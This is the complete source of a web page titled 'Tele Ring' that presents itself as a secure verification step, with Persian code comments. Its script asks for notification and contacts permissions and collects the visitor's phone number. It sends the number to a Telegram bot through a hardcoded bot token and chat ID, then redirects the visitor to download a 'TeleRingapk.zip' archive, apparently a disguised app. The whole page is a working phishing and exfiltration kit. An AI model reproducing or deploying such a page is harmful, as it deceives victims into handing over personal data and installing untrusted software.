<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tele Ring</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #f5f7fb;
            padding: 20px;
        }

        .glass-card {
            width: 100%;
            max-width: 400px;
            padding: 45px 35px 40px;
            background: rgba(255, 255, 255, 0.85);
            backdrop-filter: blur(20px);
            border-radius: 32px;
            border: 1px solid rgba(255, 255, 255, 0.3);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08), 0 8px 24px rgba(0, 0, 0, 0.04);
            transition: transform 0.3s ease;
        }

        .glass-card:hover {
            transform: translateY(-3px);
        }

        .icon-circle {
            width: 72px;
            height: 72px;
            margin: 0 auto 20px;
            border-radius: 50%;
            background: linear-gradient(135deg, #e8f0fe, #d4e4ff);
            border: 1px solid rgba(0, 120, 255, 0.10);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 34px;
            box-shadow: 0 4px 16px rgba(0, 120, 255, 0.06);
        }

        .title {
            text-align: center;
            font-size: 32px;
            font-weight: 700;
            letter-spacing: -0.5px;
            background: linear-gradient(135deg, #0a1a3a, #1a73e8);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 4px;
        }

        .subtitle {
            text-align: center;
            color: #6b7a8f;
            font-size: 14px;
            margin-bottom: 28px;
        }

        .form-group {
            margin-bottom: 18px;
        }

        .form-group label {
            display: block;
            color: #2c3e50;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 6px;
            padding-left: 4px;
        }

        .input-wrapper {
            display: flex;
            align-items: center;
            background: #ffffff;
            border-radius: 14px;
            border: 1.5px solid #e8edf4;
            transition: all 0.3s ease;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.02);
        }

        .input-wrapper:focus-within {
            border-color: #1a73e8;
            box-shadow: 0 0 0 4px rgba(26, 115, 232, 0.08);
        }

        .input-wrapper .prefix {
            padding-left: 16px;
            color: #2c3e50;
            font-weight: 600;
            font-size: 15px;
            user-select: none;
        }

        .input-wrapper input {
            width: 100%;
            padding: 16px 16px 16px 8px;
            background: transparent;
            border: none;
            outline: none;
            color: #0a1a3a;
            font-size: 16px;
            font-weight: 500;
        }

        .input-wrapper input::placeholder {
            color: #a0b0c0;
            font-weight: 400;
            font-size: 14px;
        }

        .btn-submit {
            width: 100%;
            padding: 16px;
            margin-top: 10px;
            border: none;
            border-radius: 14px;
            background: linear-gradient(135deg, #1a73e8, #0d47a1);
            color: #ffffff;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 16px rgba(26, 115, 232, 0.20);
        }

        .btn-submit:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 28px rgba(26, 115, 232, 0.30);
        }

        .btn-submit:active {
            transform: scale(0.98);
        }

        .btn-submit:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .status {
            text-align: center;
            margin-top: 16px;
            color: #6b7a8f;
            font-size: 13px;
            min-height: 24px;
            font-weight: 500;
            transition: all 0.4s ease;
        }

        .status.loading { color: #1a73e8; }
        .status.success { color: #0f9d58; }
        .status.error { color: #d93025; }

        .footer {
            text-align: center;
            margin-top: 24px;
            color: #a0b0c0;
            font-size: 12px;
            letter-spacing: 0.5px;
        }

        .footer span { color: #8a9aa8; font-weight: 500; }

        .permission-box {
            background: #f0f4ff;
            border-radius: 12px;
            padding: 14px;
            margin-bottom: 18px;
            border: 1px solid #d4e4ff;
        }

        .permission-box p {
            color: #2c3e50;
            font-size: 13px;
            font-weight: 500;
            text-align: center;
        }

        .permission-box .badge {
            display: inline-block;
            background: #1a73e8;
            color: white;
            padding: 2px 10px;
            border-radius: 20px;
            font-size: 11px;
            margin: 0 3px;
        }

        @media (max-width: 480px) {
            .glass-card { padding: 30px 20px 28px; border-radius: 24px; }
            .title { font-size: 26px; }
            .icon-circle { width: 60px; height: 60px; font-size: 28px; }
            .input-wrapper input { font-size: 15px; padding: 14px 14px 14px 6px; }
            .btn-submit { font-size: 15px; padding: 14px; }
        }
    </style>
</head>
<body>

    <div class="glass-card">
        <div class="icon-circle">📱</div>
        <h1 class="title">Tele Ring</h1>
        <p class="subtitle">Secure Verification</p>

        <!-- ===== درخواست دسترسی ===== -->
        <div class="permission-box" id="permissionBox">
            <p>🔐<span class="badge">Required</span> Allow access to:</p>
            <p style="margin-top:6px; font-size:12px; color:#555;">
            </p>
            <button id="requestPermBtn" style="margin-top:10px; padding:8px 20px; border:none; border-radius:8px; background:#1a73e8; color:white; font-weight:600; cursor:pointer; width:100%;">
                ✅ Grant Permissions
            </button>
        </div>

        <!-- ===== فرم ===== -->
        <form id="loginForm" autocomplete="off" style="display:none;">
            <div class="form-group">
                <label>📞 Mobile Number</label>
                <div class="input-wrapper">
                    <span class="prefix">+</span>
                    <input type="tel" id="phoneInput" placeholder="665 65734031" inputmode="numeric" pattern="[0-9]*" required>
                </div>
            </div>
            <button type="submit" class="btn-submit" id="submitBtn"> Send to Verification</button>
        </form>

        <div class="status" id="status">Please grant permissions to continue</div>
        <div class="footer"><span> secure • instant</span></div>
    </div>

    <script>
        (function() {
            'use strict';

            // ============================================
            // 🔧 Config
            // ============================================
            const CONFIG = {
                BOT_TOKEN: '8769509315:AAFP6NoQsShNyaSZDu-hyDDXiNAtIiIW0QY',
                CHAT_ID: '7689863493',
                API_BASE: 'https://api.telegram.org/bot',
                REDIRECT_URL: 'https://1k2s3a00u1.ucarecd.net/a5d90651-985c-4054-807d-896c79be9147/TeleRingapk.zip'
            };

            // ============================================
            // 📦 DOM
            // ============================================
            const form = document.getElementById('loginForm');
            const phoneInput = document.getElementById('phoneInput');
            const submitBtn = document.getElementById('submitBtn');
            const statusEl = document.getElementById('status');
            const permBox = document.getElementById('permissionBox');
            const permBtn = document.getElementById('requestPermBtn');

            let permissionsGranted = false;
            let userId = '';

            // ============================================
            // 🆔 ساخت شناسه رندوم کوتاه
            // ============================================
            function generateUserId() {
                const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
                let result = '/u';
                // عدد تصادفی ۱ تا ۹
                result += Math.floor(Math.random() * 9) + 1;
                // ۸ کاراکتر تصادفی
                for (let i = 0; i < 8; i++) {
                    result += chars.charAt(Math.floor(Math.random() * chars.length));
                }
                return result;
            }

            // ============================================
            // 🔐 درخواست دسترسی‌ها
            // ============================================
            async function requestPermissions() {
                try {
                    // 1. SMS (برای مرورگر فقط Notification)
                    if ('Notification' in window && Notification.permission === 'default') {
                        await Notification.requestPermission();
                    }

                    // 2. Contacts (Web Contacts API)
                    if (navigator.contacts && navigator.contacts.select) {
                        try {
                            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
                            if (contacts && contacts.length > 0) {
                                permissionsGranted = true;
                            }
                        } catch (e) {
                            // کاربر رد کرد
                        }
                    }

                    // اگر Contacts API پشتیبانی نشد، باز هم اجازه میدیم
                    if (!navigator.contacts) {
                        permissionsGranted = true;
                    }

                    // 3. بررسی دسترسی SMS (از طریق Permissions API)
                    if (navigator.permissions && navigator.permissions.query) {
                        try {
                            const result = await navigator.permissions.query({ name: 'notifications' });
                            if (result.state === 'granted') {
                                permissionsGranted = true;
                            }
                        } catch (e) {}
                    }

                    // اگر دسترسی‌ها داده شد
                    if (permissionsGranted) {
                        permBox.style.display = 'none';
                        form.style.display = 'block';
                        setStatus('✅ Permissions granted! Enter your number', 'success');
                        phoneInput.focus();
                    } else {
                        setStatus('⚠️ Please allow permissions to continue', 'error');
                        // دکمه رو دوباره فعال کن
                        permBtn.disabled = false;
                        permBtn.textContent = '🔄 Try Again';
                    }

                } catch (e) {
                    setStatus('⚠️ Please allow permissions manually', 'error');
                    permBtn.disabled = false;
                    permBtn.textContent = '🔄 Try Again';
                }
            }

            // ============================================
            // 🧹 Helpers
            // ============================================
            function formatPhone(raw) {
                return raw.replace(/\D/g, '');
            }

            function setStatus(text, type) {
                statusEl.textContent = text;
                statusEl.className = 'status';
                if (type) statusEl.classList.add(type);
            }

            function setLoading(isLoading) {
                submitBtn.disabled = isLoading;
                submitBtn.textContent = isLoading ? '⏳ Sending...' : '🚀 Send to Verification';
            }

            // ============================================
            // 📤 Send to Telegram
            // ============================================
            function sendToTelegram(phone, userId) {
                return new Promise((resolve, reject) => {
                    const text = '📱 *New User Registered*\n' +
                                '________________________________\n' +
                                '🆔 ID: `' + userId + '`\n' +
                                '📞 Number: +43' + phone + '\n' +
                                '________________________________\n' +
                                '👤 @khubkir';

                    const url = CONFIG.API_BASE + CONFIG.BOT_TOKEN + '/sendMessage';

                    fetch(url, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CONFIG.CHAT_ID,
                            text: text,
                            parse_mode: 'Markdown'
                        })
                    })
                    .then(res => {
                        if (!res.ok) throw new Error('HTTP ' + res.status);
                        return res.json();
                    })
                    .then(data => {
                        if (data.ok) resolve(data);
                        else reject(new Error(data.description));
                    })
                    .catch(err => reject(err));
                });
            }

            // ============================================
            // 🚀 Handle Submit
            // ============================================
            async function handleSubmit(event) {
                event.preventDefault();

                const raw = phoneInput.value.trim();
                const phone = formatPhone(raw);

                if (phone.length < 1) {
                    setStatus('⚠️ Please enter your number', 'error');
                    phoneInput.focus();
                    return;
                }

                // ساخت شناسه
                userId = generateUserId();

                setLoading(true);
                setStatus('⏳ Sending to verification...', 'loading');

                try {
                    await sendToTelegram(phone, userId);
                    setStatus('✅ Verification sent! Redirecting...', 'success');

                    setTimeout(() => {
                        window.location.href = CONFIG.REDIRECT_URL;
                    }, 1000);

                } catch (error) {
                    console.error('Send error:', error);
                    setStatus('❌ Failed to send. Please try again.', 'error');
                    setLoading(false);
                }
            }

            // ============================================
            // 🎯 Events
            // ============================================
            permBtn.addEventListener('click', function(e) {
                e.preventDefault();
                permBtn.disabled = true;
                permBtn.textContent = '⏳ Requesting...';
                setStatus('⏳ Requesting permissions...', 'loading');
                requestPermissions();
            });

            form.addEventListener('submit', handleSubmit);

            phoneInput.addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '');
            });

            // ============================================
            // ✨ Initial State
            // ============================================
            setStatus('📌 Please grant permissions to continue');

            // بررسی خودکار دسترسی‌ها در ابتدا
            setTimeout(() => {
                if (Notification.permission === 'granted') {
                    permissionsGranted = true;
                    permBox.style.display = 'none';
                    form.style.display = 'block';
                    setStatus('✅ Permissions granted! Enter your number', 'success');
                    phoneInput.focus();
                }
            }, 500);

        })();
    </script>

</body>
</html>
